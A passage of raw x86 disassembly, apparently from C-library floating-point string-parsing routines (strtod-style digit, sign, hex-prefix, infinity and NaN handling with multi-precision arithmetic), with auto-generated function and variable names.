cmp eax, 9
ja 0x8089c20
cmp cl, 0x30
jne 0x808859b
dec dword [var_180h]
inc ebx
dec dword [var_17ch]
mov ecx, dword [var_180h]
dec dword [var_184h]
mov dword [var_15ch], ebx
test ecx, ecx
jle 0x808859b
test ebx, ebx
js 0x8089bc9
jmp 0x808859b
dec dword [var_17ch]
jmp 0x8089bc9
mov esi, dword [var_17ch]
movzx ecx, byte [esi - 1]
mov esi, dword [arg_14h]
mov eax, dword [esi + 0x34]
movsx edx, cl
test byte [eax + edx*2 + 1], 0x10
jne 0x8089be7
jmp 0x8089c20
dec dword [var_17ch]
dec dword [var_180h]
mov edx, dword [var_17ch]
cmp byte [edx - 1], 0x30
je 0x8089c44
jmp 0x8089b9b
inc edi
mov dword [var_1ach], 0
movzx esi, byte [edi]
mov eax, esi
cmp al, 0x2d
je 0x8089dc8
cmp al, 0x2b
je 0x8089dbf
lea eax, [esi - 0x30]
cmp al, 9
ja 0x8089db4
cmp dword [var_168h], 0x10
je 0x8089d81
mov eax, dword [var_1ach]
test eax, eax
je 0x8089d6a
mov edx, dword [var_184h]
add edx, 0x168
mov eax, dword [var_15ch]
lea eax, [eax + eax*4]
lea ebx, [eax + eax]
cmp ebx, edx
mov dword [var_15ch], ebx
jg 0x8089cfe
mov ecx, esi
inc edi
movsx eax, cl
lea ebx, [eax + ebx - 0x30]
mov dword [var_15ch], ebx
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x8089cb3
mov esi, dword [var_1ach]
test esi, esi
je 0x8089b7d
neg ebx
mov dword [var_15ch], ebx
jmp 0x8089b7d
cmp dword [var_188h], 0xffffffff
je 0x8089d58
call fcn.08048b20
mov dword [eax], 0x22
mov eax, dword [var_1ach]
test eax, eax
jne 0x8089d54
mov eax, dword [var_164h]
test eax, eax
je 0x8089d4c
fld dword [0x80a6100]
inc edi
movzx eax, byte [edi]
sub eax, 0x30
cmp al, 9
jbe 0x8089d2c
mov eax, dword [arg_ch]
test eax, eax
je 0x80882b6
mov ecx, dword [arg_ch]
mov dword [ecx], edi
jmp 0x80882b6
fld dword [0x80a61a0]
jmp 0x8089d2c
fldz
jmp 0x8089d2c
mov eax, dword [var_164h]
test eax, eax
je 0x8089d54
fld dword [0x80a6104]
jmp 0x8089d2c
mov eax, dword [var_188h]
sub eax, dword [var_184h]
lea edx, [eax + 0x134]
jmp 0x8089cb3
mov eax, dword [var_1ach]
mov ecx, dword [var_184h]
test eax, eax
lea edx, [ecx*4 + 0x432]
jne 0x8089cb3
mov edx, dword [var_188h]
mov eax, ecx
shl eax, 2
sub edx, eax
lea edx, [edx + 0x400]
jmp 0x8089cb3
mov edi, dword [var_17ch]
jmp 0x8089b7d
inc edi
movzx esi, byte [edi]
jmp 0x8089c81
mov dword [var_1ach], 1
jmp 0x8089dbf
cmp dword [ecx + eax*4], 0x70
jmp 0x8089b77
cmp dword [var_168h], 0x10
je 0x8089df6
mov ecx, esi
movsx eax, cl
mov esi, dword [arg_14h]
mov ecx, dword [esi + 0x38]
jmp 0x8089b60
mov edx, esi
movsx eax, dl
mov edx, dword [arg_14h]
mov ecx, dword [edx + 0x38]
mov edx, dword [ecx + eax*4]
cmp edx, 0x60
jle 0x8089b60
cmp edx, 0x66
jle 0x8089b0d
jmp 0x8089b60
mov edx, esi
movsx eax, dl
jmp 0x8089deb
mov ecx, dword [var_18ch]
movzx eax, byte [ecx]
jmp 0x8089aeb
mov ecx, dword [var_190h]
movzx eax, byte [ecx]
jmp 0x80884e6
mov edx, dword [arg_14h]
mov ecx, esi
movsx eax, cl
mov ecx, dword [edx + 0x38]
mov eax, dword [ecx + eax*4]
cmp eax, 0x60
jbe 0x80884ab
cmp eax, 0x66
ja 0x80884ab
mov esi, esi
inc dword [var_180h]
jmp 0x80884e0
mov eax, dword [arg_14h]
mov edx, esi
mov ecx, dword [eax + 0x38]
cmp dl, byte [ecx + 0x184]
jl 0x8089e87
cmp dl, byte [ecx + 0x198]
jle 0x8088483
xor ebx, ebx
cmp byte [var_205h], 0
je 0x8088483
mov ecx, dword [var_18ch]
movzx eax, byte [ecx]
cmp al, byte [ebx + edi]
jne 0x8088483
mov edx, dword [var_18ch]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x8089e9f
jmp 0x8088483
lea esi, [esi]
mov ecx, dword [var_190h]
movzx eax, byte [ecx]
jmp 0x808846b
mov ecx, esi
cmp cl, 0x30
jne 0x808846f
inc edi
movzx esi, byte [edi]
mov eax, esi
cmp al, 0x30
je 0x8089ed9
jmp 0x808846f
mov edx, dword [arg_14h]
movsx eax, byte [edi + 1]
mov ecx, dword [edx + 0x38]
cmp dword [ecx + eax*4], 0x78
jne 0x8088414
add edi, 2
mov dword [var_168h], 0x10
movzx esi, byte [edi]
mov dword [var_194h], 0
jmp 0x8088414
test al, al
jne 0x808823d
jmp 0x808822d
mov edx, dword [var_18ch]
movzx eax, byte [edx]
jmp 0x8089f1b
inc edi
movzx esi, byte [edi]
jmp 0x80881f4
mov dword [var_164h], 1
jmp 0x8089f33
nop
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x10
mov eax, dword [arg_10h]
mov dword [var_8h], 0
mov dword [var_ch], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08088130
leave
ret
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x20
mov esi, dword [arg_1ch]
mov ecx, dword [arg_14h]
mov eax, dword [arg_ch]
mov edx, dword [arg_10h]
mov edi, dword [arg_8h]
mov dword [var_18h], ecx
mov dword [var_10h], eax
mov dword [var_14h], edx
cmp dword [var_10h], 0xffffc002
mov eax, dword [arg_18h]
mov dword [var_1ch], eax
jge 0x808a0a6
mov ebx, 0xffffc002
sub ebx, dword [var_10h]
cmp ebx, 0x40
jg 0x808a202
movzx ecx, byte [var_1ch]
mov eax, 1
mov edx, esi
or edx, 1
shl eax, cl
dec eax
test dword [var_18h], eax
cmovne esi, edx
cmp ebx, 0x40
je 0x808a1ce
cmp ebx, 0x1f
jle 0x808a19e
mov ecx, ebx
lea eax, [ebx + 0x1e]
dec ecx
cmovns eax, ecx
sar eax, 5
mov edx, dword [edi + eax*4]
shl eax, 5
mov dword [var_18h], edx
mov edx, ecx
sub edx, eax
mov dword [var_1ch], edx
xor edx, edx
lea esi, [esi]
cmp ecx, 0xffffffff
lea eax, [ebx + 0x1e]
cmovg eax, ecx
sar eax, 5
cmp edx, eax
jge 0x808a02f
mov eax, esi
or eax, 1
cmp dword [edi + edx*4], 0
cmovne esi, eax
inc edx
jmp 0x808a010
movzx ecx, byte [var_1ch]
mov eax, 1
mov edx, esi
or edx, 1
shl eax, cl
mov ecx, ebx
dec eax
test dword [var_18h], eax
mov dword [esp], edi
cmovne esi, edx
cmp ebx, 0xffffffff
lea edx, [ebx + 0x1f]
cmovg edx, ebx
sar edx, 5
mov eax, edx
shl eax, 5
sub ecx, eax
mov eax, 2
sub eax, edx
mov dword [var_sp_ch], ecx
lea edx, [edi + edx*4]
mov dword [var_4h], edx
mov dword [var_sp_8h], eax
call fcn.0808c750
xor edx, edx
nop
lea esi, [esi]
cmp ebx, 0xffffffff
lea eax, [ebx + 0x1f]
cmovg eax, ebx
sar eax, 5
cmp edx, eax
jge 0x808a09f
mov ecx, edx
inc edx
sub ecx, eax
mov dword [edi + ecx*4 + 8], 0
jmp 0x808a080
mov dword [var_10h], 0xffffc001
movzx ecx, byte [var_1ch]
mov eax, dword [var_18h]
shr eax, cl
test al, 1
je 0x808a122
test esi, esi
jne 0x808a197
mov edx, dword [edi]
test dl, 1
jne 0x808a0d0
mov eax, 1
shl eax, cl
dec eax
test dword [var_18h], eax
je 0x808a122
nop
lea eax, [edx + 1]
lea ebx, [edi + 4]
mov esi, 2
cmp eax, edx
mov dword [edi], eax
mov ecx, ebx
jae 0x808a163
mov eax, dword [edi + 4]
lea ebx, [edi + 8]
mov esi, 1
mov ecx, ebx
inc eax
test eax, eax
mov dword [edi + 4], eax
jne 0x808a163
inc dword [var_10h]
mov dword [esp], edi
mov dword [var_4h], edi
mov dword [var_sp_ch], 1
mov dword [var_sp_8h], 2
call fcn.0808c750
or dword [edi + 4], 0x80000000
cmp dword [var_10h], 0x4000
jle 0x808a148
mov eax, dword [var_14h]
test eax, eax
je 0x808a140
fld dword [0x80a6100]
add esp, 0x20
pop ebx
pop esi
pop edi
leave
ret
fld dword [0x80a61a0]
jmp 0x808a138
mov eax, dword [var_14h]
mov edx, dword [var_10h]
mov dword [arg_8h], edi
mov dword [arg_10h], eax
mov dword [arg_ch], edx
add esp, 0x20
pop ebx
pop esi
pop edi
leave
jmp 0x808d8e0
cmp ecx, ebx
je 0x808a17b
xor edx, edx
dec esi
cmp edx, esi
jge 0x808a17b
mov esi, esi
mov eax, dword [ebx + edx*4]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, esi
jl 0x808a170
cmp dword [var_10h], 0xffffc001
jne 0x808a122
mov edx, dword [edi + 4]
mov eax, 0xffffc002
test edx, edx
cmovns eax, dword [var_10h]
mov dword [var_10h], eax
jmp 0x808a122
mov edx, dword [edi]
jmp 0x808a0d0
test ebx, ebx
jle 0x808a09f
mov eax, dword [edi]
lea edx, [ebx - 1]
mov dword [var_1ch], edx
mov dword [var_18h], eax
mov dword [esp], edi
mov dword [var_4h], edi
mov dword [var_sp_ch], ebx
mov dword [var_sp_8h], 2
call fcn.0808c750
jmp 0x808a09f
mov eax, dword [edi + 4]
mov dword [var_1ch], 0x1f
xor edx, edx
mov dword [var_18h], eax
mov ecx, dword [edi + edx*4]
mov eax, esi
or eax, 1
test ecx, ecx
cmovne esi, eax
inc edx
cmp edx, 1
jle 0x808a1dd
mov dword [edi], 0
mov dword [edi + 4], 0
jmp 0x808a09f
call fcn.08048b20
fldz
mov dword [eax], 0x21
jmp 0x808a138
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
xor esi, esi
push ebx
sub esp, 0x18
mov eax, dword [arg_14h]
mov ebx, dword [arg_8h]
mov dword [eax], 0
lea esi, [esi]
cmp edi, 9
je 0x808a399
movzx ecx, byte [ebx]
lea eax, [ecx - 0x30]
cmp al, 9
jbe 0x808a26b
mov eax, dword [arg_24h]
test eax, eax
je 0x808a265
mov eax, dword [arg_24h]
cmp cl, byte [eax]
je 0x808a35f
add ebx, dword [arg_20h]
movzx ecx, byte [ebx]
movsx eax, cl
dec dword [arg_ch]
lea edx, [esi + esi*4]
lea esi, [eax + edx*2 - 0x30]
inc ebx
inc edi
mov eax, dword [arg_ch]
test eax, eax
jg 0x808a240
mov edx, dword [arg_18h]
mov eax, dword [edx]
test eax, eax
jle 0x808a353
lea edx, [eax + edi]
cmp edx, 9
jg 0x808a353
imul esi, dword [eax*4 + 0x80a61c0]
mov ecx, dword [arg_18h]
mov edx, dword [edx*4 + 0x80a61c0]
mov dword [ecx], 0
mov ecx, dword [arg_14h]
mov eax, dword [ecx]
test eax, eax
jne 0x808a2d0
mov eax, dword [arg_10h]
mov dword [eax], esi
mov dword [ecx], 1
add esp, 0x18
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_ch], edx
mov dword [var_8h], eax
mov edx, dword [arg_10h]
mov dword [var_4h], edx
mov dword [esp], edx
call fcn.0808cae0
mov dword [var_14h], eax
mov edi, dword [arg_10h]
mov eax, dword [arg_14h]
mov ecx, dword [eax]
add edi, 4
mov eax, dword [arg_10h]
mov edx, dword [eax]
lea eax, [edx + esi]
mov esi, dword [arg_10h]
cmp eax, edx
mov dword [esi], eax
mov esi, edi
jae 0x808a339
dec ecx
je 0x808a31d
mov edx, dword [edi]
add edi, 4
inc edx
mov dword [esi], edx
add esi, 4
test edx, edx
jne 0x808a339
dec ecx
jne 0x808a30b
mov eax, 1
add dword [var_14h], eax
je 0x808a2c6
mov edx, dword [arg_14h]
mov esi, dword [var_14h]
mov ecx, dword [arg_10h]
mov eax, dword [edx]
mov dword [ecx + eax*4], esi
inc dword [edx]
jmp 0x808a2c6
cmp esi, edi
je 0x808a34f
xor edx, edx
dec ecx
cmp edx, ecx
jge 0x808a34f
mov eax, dword [edi + edx*4]
mov dword [esi + edx*4], eax
inc edx
cmp edx, ecx
jl 0x808a344
xor eax, eax
jmp 0x808a322
mov edx, dword [edi*4 + 0x80a61c0]
jmp 0x808a2b2
movzx eax, byte [eax + 1]
mov edx, 1
test al, al
je 0x808a390
lea esi, [esi]
cmp al, byte [edx + ebx]
jne 0x808a381
mov ecx, dword [arg_24h]
inc edx
movzx eax, byte [edx + ecx]
test al, al
jne 0x808a370
test al, al
jne 0x808a265
add ebx, edx
jmp 0x808a268
mov ecx, dword [arg_24h]
movzx eax, byte [ecx + 1]
jmp 0x808a381
mov edx, dword [arg_14h]
mov eax, dword [edx]
test eax, eax
jne 0x808a3b6
mov ecx, dword [arg_10h]
mov dword [ecx], esi
mov dword [edx], 1
xor edi, edi
xor esi, esi
jmp 0x808a249
mov dword [var_8h], eax
mov dword [var_ch], 0x3b9aca00
mov eax, dword [arg_10h]
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808cae0
mov dword [var_10h], eax
mov edx, dword [arg_14h]
mov edi, dword [arg_10h]
mov eax, dword [arg_10h]
mov ecx, dword [edx]
add edi, 4
mov edx, dword [eax]
lea eax, [edx + esi]
mov esi, dword [arg_10h]
cmp eax, edx
mov dword [esi], eax
mov esi, edi
jae 0x808a423
dec ecx
je 0x808a407
mov edx, dword [edi]
add edi, 4
inc edx
mov dword [esi], edx
add esi, 4
test edx, edx
jne 0x808a423
dec ecx
jne 0x808a3f5
mov eax, 1
add dword [var_10h], eax
je 0x808a3ad
mov edx, dword [arg_14h]
mov esi, dword [var_10h]
mov ecx, dword [arg_10h]
mov eax, dword [edx]
mov dword [ecx + eax*4], esi
inc dword [edx]
jmp 0x808a3ad
cmp esi, edi
je 0x808a43b
xor edx, edx
dec ecx
cmp edx, ecx
jge 0x808a43b
mov esi, esi
mov eax, dword [edi + edx*4]
mov dword [esi + edx*4], eax
inc edx
cmp edx, ecx
jl 0x808a430
xor eax, eax
jmp 0x808a40c
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1138
mov ecx, dword [arg_10h]
mov eax, dword [arg_14h]
mov dword [var_1078h], 0xa
mov dword [var_10a0h], 0
test ecx, ecx
mov edx, dword [eax + 4]
je 0x808a499
mov ecx, dword [edx + 0x2c]
mov dword [var_10a4h], ecx
movzx eax, byte [ecx]
test al, al
jle 0x808a499
cmp al, 0x7f
je 0x808a499
mov esi, dword [edx + 0x28]
mov dword [var_10a0h], esi
cmp byte [esi], 0
jne 0x808a4a3
mov dword [var_10a0h], 0
mov dword [var_10a4h], 0
mov edx, dword [edx + 0x24]
mov dword [var_109ch], edx
mov dword [esp], edx
call fcn.08053400
mov edi, dword [arg_8h]
mov dword [var_1080h], 0
mov dword [var_10a8h], eax
mov dword [var_106ch], 0
mov dword [var_1074h], 0
mov eax, dword [arg_14h]
dec edi
mov edx, dword [eax + 0x34]
inc edi
movzx esi, byte [edi]
mov ecx, esi
movsx eax, cl
test byte [edx + eax*2 + 1], 0x20
jne 0x808a4e2
cmp cl, 0x2d
je 0x808c261
cmp cl, 0x2b
je 0x808c258
mov edx, dword [var_109ch]
xor ebx, ebx
movzx edx, byte [edx]
test dl, dl
mov byte [var_1112h], dl
mov byte [var_1111h], dl
je 0x808c24d
mov eax, edx
cmp byte [ebx + edi], al
jne 0x808c240
mov ecx, dword [var_109ch]
inc ebx
movzx eax, byte [ebx + ecx]
test al, al
jne 0x808a525
movzx eax, byte [ebx + edi]
cmp al, 0x2f
jle 0x808a54d
cmp al, 0x39
jle 0x808a727
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x808a727
mov ecx, esi
mov esi, dword [arg_14h]
movsx eax, cl
mov ebx, eax
mov ecx, dword [esi + 0x38]
cmp dword [ecx + eax*4], 0x69
je 0x808a6a9
cmp dword [ecx + ebx*4], 0x6e
jne 0x808a693
mov ecx, dword [arg_14h]
mov dword [var_8h], 3
mov dword [var_4h], 0x80a0fb8
mov dword [esp], edi
mov dword [var_ch], ecx
call fcn.0808dd40
test eax, eax
jne 0x808a693
fld dword [0x80a61a4]
add edi, 3
fstp xword [ebp - 0x10b4]
cmp byte [edi], 0x28
je 0x808a5d1
mov eax, dword [arg_ch]
test eax, eax
je 0x808a5c0
mov eax, dword [arg_ch]
mov dword [eax], edi
fld xword [ebp - 0x10b4]
add esp, 0x1138
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [arg_14h]
mov ebx, edi
mov ecx, dword [eax + 0x38]
inc edi
movzx edx, byte [edi]
lea eax, [edx - 0x30]
cmp al, 9
jbe 0x808a5d9
movsx eax, dl
mov eax, dword [ecx + eax*4]
cmp eax, 0x60
jle 0x808a5f4
cmp eax, 0x7a
jle 0x808a5d9
cmp dl, 0x5f
je 0x808a5d9
cmp dl, 0x29
je 0x808a602
mov edi, ebx
jmp 0x808a5b4
mov edx, dword [arg_14h]
lea eax, [var_1060h]
mov dword [var_ch], 0
mov dword [var_4h], eax
mov dword [var_8h], 0
lea eax, [ebx + 1]
mov dword [esp], eax
mov dword [var_10h], edx
call fcn.080856c0
cmp dword [var_1060h], edi
mov ecx, eax
mov ebx, edx
jne 0x808a5b4
and edx, 0x7fffffff
mov dword [var_105ch], 0
mov dword [var_1058h], 0xc0000000
mov esi, edx
mov dword [var_1054h], 0x7fff
or esi, eax
jne 0x808a66f
xor ecx, ecx
mov ebx, 0x40000000
mov eax, ebx
mov dword [var_105ch], ecx
or eax, 0x80000000
mov dword [var_1058h], eax
fld xword [ebp - 0x105c]
fstp xword [ebp - 0x10b4]
jmp 0x808a5b4
mov eax, dword [arg_ch]
test eax, eax
je 0x808a6a2
mov ecx, dword [arg_8h]
mov edx, dword [arg_ch]
mov dword [edx], ecx
fldz
jmp 0x808a5c6
mov dword [var_ch], esi
mov dword [var_8h], 3
mov dword [var_4h], 0x80a0fc0
mov dword [esp], edi
call fcn.0808dd40
test eax, eax
jne 0x808a71c
mov eax, dword [arg_ch]
test eax, eax
je 0x808a6fc
lea ebx, [edi + 3]
mov dword [var_ch], esi
mov dword [var_8h], 5
mov dword [esp], ebx
mov dword [var_4h], str.inity
call fcn.0808dd40
test eax, eax
lea edx, [edi + 8]
mov eax, dword [arg_ch]
cmove ebx, edx
mov dword [eax], ebx
mov edx, dword [var_1074h]
test edx, edx
je 0x808a711
fld dword [0x80a6100]
jmp 0x808a5c6
fld dword [0x80a61a0]
jmp 0x808a5c6
mov edx, dword [arg_14h]
mov ecx, dword [edx + 0x38]
jmp 0x808a56f
mov eax, esi
cmp al, 0x30
je 0x808c207
mov eax, dword [var_10a0h]
mov dword [var_1088h], edi
test eax, eax
je 0x808c1ed
mov ecx, dword [var_10a0h]
movzx edx, byte [ecx]
mov esi, esi
mov eax, esi
cmp al, 0x30
je 0x808a785
xor ebx, ebx
test dl, dl
je 0x808c1df
mov ecx, dword [var_10a0h]
movzx eax, byte [ecx]
lea esi, [esi]
mov ecx, esi
cmp cl, al
jne 0x808a78b
mov ecx, dword [var_10a0h]
inc ebx
movzx eax, byte [ebx + ecx]
test al, al
jne 0x808a770
inc edi
movzx esi, byte [edi]
jmp 0x808a750
test al, al
je 0x808a785
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x808a7a3
cmp dword [var_1078h], 0x10
je 0x808c18e
mov dword [var_1084h], edi
mov dword [var_1090h], 0
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x808c183
cmp dword [var_1078h], 0x10
je 0x808c163
mov eax, dword [var_10a0h]
test eax, eax
je 0x808a80a
mov ecx, dword [var_10a0h]
xor ebx, ebx
movzx eax, byte [ecx]
test al, al
je 0x808c155
cmp al, byte [ebx + edi]
jne 0x808a806
mov edx, dword [var_10a0h]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x808a7e8
lea esi, [esi]
inc edi
movzx esi, byte [edi]
jmp 0x808a7b3
test al, al
je 0x808a800
mov eax, dword [var_10a4h]
test eax, eax
je 0x808bdc3
mov ebx, dword [var_1090h]
test ebx, ebx
jle 0x808bdc3
mov ecx, dword [var_1088h]
mov eax, dword [var_10a4h]
mov dword [var_4h], edi
mov edx, dword [var_10a0h]
mov dword [esp], ecx
mov dword [var_ch], eax
mov dword [var_8h], edx
call fcn.08049980
cmp edi, eax
mov ecx, eax
je 0x808bdb4
cmp eax, dword [var_1088h]
je 0x808bd9c
cmp eax, dword [var_1084h]
jb 0x808bd8c
mov ecx, dword [var_1084h]
mov edi, eax
mov dword [var_1090h], 0
cmp ecx, eax
jae 0x808a8a5
movzx eax, byte [ecx]
mov edx, dword [var_1090h]
inc edx
sub eax, 0x30
cmp al, 9
cmova edx, dword [var_1090h]
inc ecx
cmp ecx, edi
mov dword [var_1090h], edx
jb 0x808a884
mov ecx, dword [var_1090h]
mov dword [var_1098h], 0
mov dword [var_1094h], ecx
mov edx, dword [arg_ch]
test edx, edx
je 0x808a8c7
mov edx, dword [arg_ch]
mov dword [edx], edi
mov eax, dword [var_1090h]
test eax, eax
jne 0x808a8ea
mov eax, dword [var_1074h]
test eax, eax
je 0x808a6a2
fld dword [0x80a6104]
jmp 0x808a5c6
mov eax, dword [var_1098h]
test eax, eax
je 0x808a99c
mov ecx, dword [var_109ch]
mov esi, dword [var_109ch]
movzx ecx, byte [ecx]
mov byte [var_1112h], cl
movzx edx, byte [esi + 1]
mov ecx, dword [var_1084h]
movzx eax, byte [var_1112h]
cmp byte [ecx], al
je 0x808a92a
inc dword [var_1084h]
jmp 0x808a911
test dl, dl
mov ebx, 1
je 0x808bd80
mov esi, dword [var_109ch]
movzx eax, byte [esi + 1]
mov ecx, dword [var_1084h]
cmp al, byte [ebx + ecx]
jne 0x808bd70
mov esi, dword [var_109ch]
inc ebx
movzx eax, byte [ebx + esi]
test al, al
jne 0x808a941
mov eax, dword [var_1098h]
add eax, dword [var_10a8h]
add dword [var_1084h], eax
cmp dword [var_1078h], 0x10
je 0x808bd5a
mov edx, dword [var_106ch]
sub edx, dword [var_1098h]
mov esi, dword [var_1098h]
mov dword [var_106ch], edx
sub dword [var_1090h], esi
cmp dword [var_1078h], 0x10
je 0x808bb42
mov ebx, dword [var_106ch]
test ebx, ebx
mov edx, ebx
js 0x808bb29
mov eax, dword [var_1090h]
sub eax, dword [var_1094h]
cmp ebx, eax
cmovle eax, ebx
add dword [var_1094h], eax
mov ebx, edx
sub ebx, eax
mov eax, dword [var_1094h]
mov dword [var_106ch], ebx
add eax, ebx
cmp eax, 0x1345
jg 0x808ab74
cmp ebx, 0xffffecaa
jl 0x808bb19
mov ecx, dword [var_1094h]
test ecx, ecx
jle 0x808ad3c
mov esi, dword [var_109ch]
mov edx, dword [var_10a0h]
lea eax, [var_106ch]
mov ecx, dword [var_10a8h]
mov dword [var_10h], eax
mov eax, dword [var_1084h]
mov dword [var_14h], esi
mov dword [var_1ch], edx
mov esi, dword [var_1094h]
mov dword [var_18h], ecx
lea edx, [var_1070h]
mov dword [esp], eax
lea ecx, [var_82ch]
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov dword [var_4h], esi
call fcn.0808a220
mov ebx, dword [var_106ch]
mov dword [var_1084h], eax
test ebx, ebx
jle 0x808ab49
lea edx, [var_82ch]
lea ecx, [var_104ch]
mov edi, 1
mov dword [var_10c0h], edx
mov dword [var_10c4h], ecx
mov dword [var_10c8h], 0x80a7020
test edi, ebx
je 0x808ab26
mov eax, dword [var_10c8h]
mov edx, dword [var_1070h]
xor ebx, edi
mov dword [var_106ch], ebx
mov esi, dword [eax + 4]
sub esi, 2
cmp edx, esi
jl 0x808baea
mov dword [var_10h], esi
mov eax, dword [eax]
mov dword [var_8h], edx
mov edx, dword [var_10c4h]
lea eax, [eax*4 + 0x80a6248]
mov dword [var_ch], eax
mov dword [esp], edx
mov eax, dword [var_10c0h]
mov dword [var_4h], eax
call fcn.0808c7c0
mov edx, eax
mov eax, dword [var_1070h]
add eax, esi
test edx, edx
mov dword [var_1070h], eax
jne 0x808ab08
dec eax
mov dword [var_1070h], eax
mov eax, dword [var_10c0h]
mov esi, dword [var_10c4h]
mov ebx, dword [var_106ch]
mov dword [var_10c0h], esi
mov dword [var_10c4h], eax
add edi, edi
add dword [var_10c8h], 0x10
test ebx, ebx
jne 0x808aa96
lea eax, [var_104ch]
cmp dword [var_10c0h], eax
je 0x808bace
mov edx, dword [var_1070h]
bsr ecx, dword [ebp + edx*4 - 0x830]
xor ecx, 0x1f
mov eax, edx
mov dword [var_10cch], edx
shl eax, 5
sub eax, ecx
cmp eax, 0x4000
mov dword [var_1080h], eax
jle 0x808ab84
call fcn.08048b20
mov dword [eax], 0x22
jmp 0x808a6fc
cmp dword [var_1080h], 0x40
jle 0x808ad00
mov edx, dword [var_1080h]
mov eax, dword [var_1080h]
mov dword [var_10d4h], 0x1f
sub edx, 0x21
sub eax, 0x40
mov esi, eax
mov edi, eax
cmovs esi, edx
sar esi, 5
mov edx, esi
lea ecx, [esi - 1]
shl edx, 5
sub edi, edx
cmovne ecx, esi
lea eax, [edi - 1]
test edi, edi
cmove eax, dword [var_10d4h]
mov dword [var_10d0h], ecx
mov dword [var_10d4h], eax
jne 0x808ac78
mov eax, dword [ebp + esi*4 - 0x82c]
mov dword [var_1068h], eax
mov eax, dword [ebp + esi*4 - 0x828]
mov dword [var_1064h], eax
mov eax, dword [var_82ch]
xor ebx, ebx
test eax, eax
jne 0x808ac14
inc ebx
mov eax, dword [ebp + ebx*4 - 0x82c]
test eax, eax
je 0x808ac08
xor eax, eax
mov esi, dword [var_1090h]
cmp dword [var_1094h], esi
jl 0x808ac2c
cmp ebx, dword [var_10d0h]
jge 0x808ac31
mov eax, 1
mov dword [var_14h], eax
mov edx, dword [var_10d0h]
mov ecx, dword [var_1074h]
mov eax, dword [var_10d4h]
mov dword [var_8h], ecx
mov dword [var_10h], eax
mov eax, dword [ebp + edx*4 - 0x82c]
mov dword [var_ch], eax
mov eax, dword [var_1080h]
dec eax
lea esi, [var_1068h]
mov dword [var_4h], eax
mov dword [esp], esi
call fcn.08089f80
jmp 0x808a5c6
mov eax, dword [var_10cch]
mov ebx, esi
dec eax
cmp esi, eax
jge 0x808acde
mov dword [var_10d8h], eax
mov dword [var_10dch], 0x20
lea eax, [var_1068h]
sub dword [var_10dch], edi
mov dword [var_1124h], eax
mov edx, dword [ebp + ebx*4 - 0x82c]
mov ecx, edi
mov eax, dword [ebp + ebx*4 - 0x828]
inc ebx
shr edx, cl
movzx ecx, byte [var_10dch]
shl eax, cl
or edx, eax
mov eax, dword [var_1124h]
mov dword [eax], edx
add eax, 4
cmp ebx, dword [var_10d8h]
mov dword [var_1124h], eax
jl 0x808aca7
mov eax, ebx
sub eax, esi
dec eax
jg 0x808abfc
mov eax, dword [ebp + ebx*4 - 0x82c]
mov ecx, edi
shr eax, cl
jmp 0x808abf6
lea esi, [esi]
mov eax, dword [var_1094h]
cmp dword [var_1090h], eax
je 0x808b95b
mov ecx, dword [var_10cch]
lea esi, [var_82ch]
lea edi, [var_1068h]
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov eax, dword [var_1070h]
cmp eax, 1
jle 0x808b94b
mov esi, 0x42
lea edx, [var_104ch]
lea ecx, [var_82ch]
sub esi, dword [var_1080h]
mov dword [var_10ech], edx
mov dword [var_10f0h], ecx
mov edx, 0x55555556
mov ecx, dword [var_1090h]
mov dword [var_10f4h], 0x80a7020
sub ecx, dword [var_1094h]
mov dword [var_10e8h], 0
mov eax, esi
imul edx
mov eax, esi
sar eax, 0x1f
sub edx, eax
lea eax, [edx + 2]
cmp ecx, eax
jle 0x808adb0
mov ecx, dword [var_1094h]
mov dword [var_10e8h], 1
lea edx, [edx + ecx + 2]
mov dword [var_1090h], edx
mov esi, dword [var_1090h]
mov dword [var_107ch], 0
sub esi, dword [var_1094h]
sub esi, ebx
mov ebx, 1
mov dword [var_10e4h], esi
test dword [var_10e4h], ebx
je 0x808ae1b
mov eax, dword [var_107ch]
xor dword [var_10e4h], ebx
test eax, eax
jne 0x808b8cf
mov eax, dword [var_10f4h]
mov edi, dword [var_10ech]
cld
mov edx, dword [eax + 4]
mov esi, dword [eax]
sub edx, 2
lea esi, [esi*4 + 0x80a6248]
mov ecx, edx
mov dword [var_107ch], edx
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov eax, dword [var_10e4h]
add ebx, ebx
add dword [var_10f4h], 0x10
test eax, eax
jne 0x808add3
lea eax, [var_82ch]
cmp dword [var_10ech], eax
je 0x808b8b3
mov edx, dword [var_10a0h]
mov esi, dword [var_109ch]
lea eax, [var_106ch]
mov ecx, dword [var_10a8h]
mov dword [var_10h], eax
mov dword [var_1ch], edx
mov dword [var_14h], esi
lea edx, [var_1070h]
mov esi, dword [var_1094h]
mov dword [var_ch], edx
mov dword [var_18h], ecx
sub dword [var_1090h], esi
mov edx, dword [var_1084h]
lea ecx, [var_82ch]
mov eax, dword [var_1090h]
mov dword [var_8h], ecx
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.0808a220
mov ecx, dword [var_107ch]
bsr eax, dword [ebp + ecx*4 - 0x1050]
mov ebx, eax
xor ebx, 0x1f
jle 0x808af09
lea esi, [var_104ch]
mov dword [var_8h], ecx
mov dword [var_ch], ebx
mov dword [var_4h], esi
mov dword [esp], esi
call fcn.0808c6f0
mov eax, dword [var_1070h]
lea edx, [var_82ch]
mov dword [var_ch], ebx
mov dword [var_4h], edx
mov dword [esp], edx
